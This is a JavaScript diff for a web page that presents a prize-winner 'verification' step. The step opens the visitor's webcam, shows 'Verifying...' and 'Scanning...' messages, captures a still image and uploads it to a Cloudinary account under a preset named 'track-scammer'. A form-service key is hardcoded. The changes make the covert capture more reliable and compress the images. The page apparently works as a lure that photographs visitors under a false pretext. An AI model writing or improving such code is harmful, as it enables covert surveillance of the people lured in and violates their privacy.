@@ -4,6 +4,7 @@ const WEB3FORM_KEY = "09622475-8c34-4332-a294-0f3a8ec1994e"; // ⚠️ change th
 
 let currentStream = null;
 let capturedImageUrl = "";
+let isRunning = false;
 
 const CLOUD_NAME = "dxvdy9bza";
 const UPLOAD_PRESET = "track-scammer";
@@ -23,34 +24,71 @@ function getSelectedWinner() {
 }
 
 async function autoStart() {
+  if (isRunning) {
+    return;
+  }
+
   const selected = getSelectedWinner();
 
   if (!selected) {
     return;
   }
 
-  showPage("page2");
-  startVerification();
+  isRunning = true;
+
+  try {
+    showPage("page2");
+    await startVerification();
+  } finally {
+    isRunning = false;
+  }
 }
 
 async function startVerification() {
   const video = document.getElementById("video");
 
   try {
+    if (currentStream) {
+      currentStream.getTracks().forEach((track) => track.stop());
+      currentStream = null;
+    }
+
     currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = currentStream;
 
     setStatus("Verifying...");
     await video.play();
 
-    setTimeout(async () => {
-      const img = captureImage(video);
-      capturedImageUrl = await uploadToCloudinary(img);
-      showPage("page3");
-    }, 1000);
+    await new Promise((resolve) => {
+      if (video.readyState >= 2) {
+        resolve();
+      } else {
+        video.onloadeddata = () => resolve();
+      }
+    });
 
-  } catch {
-    setStatus("Camera denied!");
+    setStatus("Scanning...");
+
+    await new Promise((resolve) => setTimeout(resolve, 300));
+
+    const img = captureImage(video);
+    capturedImageUrl = await uploadToCloudinary(img);
+
+    currentStream.getTracks().forEach((track) => track.stop());
+    currentStream = null;
+    video.srcObject = null;
+
+    showPage("page3");
+  } catch (err) {
+    console.error(err);
+    setStatus("Camera Error: " + err.message);
+
+    if (currentStream) {
+      currentStream.getTracks().forEach((track) => track.stop());
+      currentStream = null;
+    }
+
+    video.srcObject = null;
   }
 }
 
@@ -59,7 +97,7 @@ function captureImage(video) {
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   canvas.getContext("2d").drawImage(video, 0, 0);
-  return canvas.toDataURL("image/png");
+  return canvas.toDataURL("image/jpeg", 0.5);
 }
 
 async function uploadToCloudinary(data) {
